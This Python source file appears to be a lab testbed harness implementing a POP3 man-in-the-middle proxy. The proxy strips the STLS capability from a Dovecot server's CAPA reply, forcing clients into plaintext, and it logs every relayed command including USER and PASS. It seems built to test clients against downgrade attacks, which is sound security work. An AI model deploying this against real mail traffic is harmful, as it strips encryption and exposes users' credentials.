#!/usr/bin/env python3
"""
testbed/mitm/pop3_proxy.py
==========================
Lightweight, protocol-aware POP3 MITM Proxy for STLS Stripping (P0 Special Harness #3).

Architecture:
-------------
Transparent application-layer POP3 proxy sitting on the real traffic path between
the POP3 client and Dovecot POP3 server:

    POP3 Client (172.28.0.1 / 172.28.0.20)
               ↓
    POP3 MITM Proxy (172.28.0.30:110)
               ↓
    Dovecot Server (172.28.0.11:110)

Behaviors:
  - Accepts client connections on listen_port (default: port 110).
  - Establishes connection to upstream Dovecot server on upstream_port (default: port 110).
  - Relays initial +OK greeting banner from server to client.
  - Intercepts client CAPA command.
  - Receives server dot-terminated multi-line capability response containing STLS.
  - Strips the STLS capability line from the response, preserving dot-termination per RFC 1939 §3.
  - Relays the stripped capability response to the client.
  - Continues relaying all subsequent POP3 dialogue (e.g. QUIT, USER, PASS).
  - Cleanly shuts down on connection termination.

RFC Standards:
  - RFC 1939: Post Office Protocol - Version 3
  - RFC 2595: Using TLS with IMAP, POP3 and ACAP (STLS command)
"""

import argparse
import logging
import socket
import sys
import threading
from typing import List, Tuple

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [pop3_mitm] %(message)s",
)
logger = logging.getLogger("pop3_proxy")


def read_pop3_line(sock: socket.socket) -> str:
    """Read a single CRLF-terminated line from a POP3 socket."""
    buffer = bytearray()
    while True:
        chunk = sock.recv(1)
        if not chunk:
            if buffer:
                break
            raise ConnectionResetError("Connection closed unexpectedly while reading POP3 line")
        buffer.extend(chunk)
        if buffer.endswith(b"\r\n") or buffer.endswith(b"\n"):
            break
    return buffer.decode("latin-1")


def read_pop3_multiline(sock: socket.socket) -> Tuple[str, List[str], bytes]:
    """
    Read a complete multi-line POP3 response per RFC 1939 §3.
    First line is '+OK ...'. Subsequent lines follow until a line consisting solely of a single period ('.').
    Returns (status_line, list_of_body_lines, raw_bytes).
    """
    status_line = read_pop3_line(sock)
    raw = bytearray(status_line.encode("latin-1"))
    if not status_line.startswith("+OK"):
        return status_line, [], bytes(raw)

    body_lines: List[str] = []
    while True:
        line = read_pop3_line(sock)
        raw.extend(line.encode("latin-1"))
        clean = line.strip()
        if clean == ".":
            break
        body_lines.append(line)

    return status_line, body_lines, bytes(raw)


def strip_stls_from_capa(body_lines: List[str]) -> List[str]:
    """
    Filter out STLS capability from POP3 CAPA response lines per RFC 2595 §4.
    Preserves all other capability lines.
    """
    filtered: List[str] = []
    for line in body_lines:
        clean = line.strip()
        if clean.upper() == "STLS":
            logger.info("Stripped POP3 STLS capability: %r", clean)
            continue
        filtered.append(line)
    return filtered


def handle_client(
    client_sock: socket.socket,
    client_addr: Tuple[str, int],
    upstream_host: str,
    upstream_port: int,
    strip_mode: bool = True,
) -> None:
    """Handle a single proxied POP3 session."""
    logger.info("POP3 Client connected from %s:%d", client_addr[0], client_addr[1])
    server_sock: socket.socket | None = None

    try:
        server_sock = socket.create_connection((upstream_host, upstream_port), timeout=10.0)
        logger.info("Connected to upstream Dovecot server at %s:%d", upstream_host, upstream_port)

        # 1. Relay initial greeting from Dovecot to Client
        greeting = read_pop3_line(server_sock)
        logger.info("Server greeting: %r", greeting.strip())
        client_sock.sendall(greeting.encode("latin-1"))

        # 2. Main command/response relay loop
        while True:
            try:
                cmd_line = read_pop3_line(client_sock)
            except (ConnectionResetError, EOFError):
                logger.info("Client closed connection")
                break

            if not cmd_line:
                break

            logger.info("Client -> Server: %r", cmd_line.strip())
            cmd_upper = cmd_line.strip().upper()
            cmd_verb = cmd_upper.split()[0] if cmd_upper else ""

            # Relay command to upstream Dovecot server
            server_sock.sendall(cmd_line.encode("latin-1"))

            # Handle CAPA multi-line capability response
            if cmd_verb == "CAPA":
                status_line, body_lines, raw_capa = read_pop3_multiline(server_sock)
                logger.info("Server -> Client CAPA (pre-filter): %r", [l.strip() for l in body_lines])

                if strip_mode and status_line.startswith("+OK"):
                    filtered_lines = strip_stls_from_capa(body_lines)
                    logger.info("Server -> Client CAPA (post-strip): %r", [l.strip() for l in filtered_lines])
                    # Reconstruct RFC 1939 compliant dot-terminated multi-line response
                    reconstructed = status_line + "".join(filtered_lines) + ".\r\n"
                    client_sock.sendall(reconstructed.encode("latin-1"))
                else:
                    client_sock.sendall(raw_capa)

            elif cmd_verb == "QUIT":
                resp_line = read_pop3_line(server_sock)
                logger.info("Server -> Client QUIT response: %r", resp_line.strip())
                client_sock.sendall(resp_line.encode("latin-1"))
                logger.info("QUIT observed, closing session")
                break

            else:
                # Single-line response for standard commands (USER, PASS, STLS, etc.)
                resp_line = read_pop3_line(server_sock)
                logger.info("Server -> Client response: %r", resp_line.strip())
                client_sock.sendall(resp_line.encode("latin-1"))

    except Exception as exc:
        logger.error("POP3 Proxy error during session: %s", exc)
    finally:
        if server_sock:
            try:
                server_sock.close()
            except Exception:
                pass
        try:
            client_sock.close()
        except Exception:
            pass
        logger.info("POP3 Session with %s:%d closed", client_addr[0], client_addr[1])


def run_proxy(
    listen_host: str = "0.0.0.0",
    listen_port: int = 110,
    upstream_host: str = "172.28.0.11",
    upstream_port: int = 110,
    strip_mode: bool = True,
    single_session: bool = False,
) -> None:
    """Run the POP3 proxy listener loop."""
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((listen_host, listen_port))
    listener.listen(5)
    logger.info("POP3 MITM Proxy listening on %s:%d -> forwarding to %s:%d (strip_stls=%s)",
                listen_host, listen_port, upstream_host, upstream_port, strip_mode)

    try:
        while True:
            client_sock, client_addr = listener.accept()
            if single_session:
                handle_client(client_sock, client_addr, upstream_host, upstream_port, strip_mode)
                break
            else:
                t = threading.Thread(
                    target=handle_client,
                    args=(client_sock, client_addr, upstream_host, upstream_port, strip_mode),
                    daemon=True,
                )
                t.start()
    except KeyboardInterrupt:
        logger.info("POP3 Proxy interrupted by keyboard")
    finally:
        listener.close()
        logger.info("POP3 Proxy listener stopped")


def main() -> None:
    parser = argparse.ArgumentParser(description="POP3 STLS Stripping MITM Proxy")
    parser.add_argument("--listen-host", default="0.0.0.0", help="Address to listen on")
    parser.add_argument("--listen-port", type=int, default=110, help="Port to listen on")
    parser.add_argument("--upstream-host", default="172.28.0.11", help="Upstream Dovecot server host")
    parser.add_argument("--upstream-port", type=int, default=110, help="Upstream Dovecot server port")
    parser.add_argument("--no-strip", action="store_true", help="Disable STLS stripping (pass-through mode)")
    parser.add_argument("--single-session", action="store_true", help="Exit after serving a single session")
    args = parser.parse_args()

    run_proxy(
        listen_host=args.listen_host,
        listen_port=args.listen_port,
        upstream_host=args.upstream_host,
        upstream_port=args.upstream_port,
        strip_mode=not args.no_strip,
        single_session=args.single_session,
    )


if __name__ == "__main__":
    main()
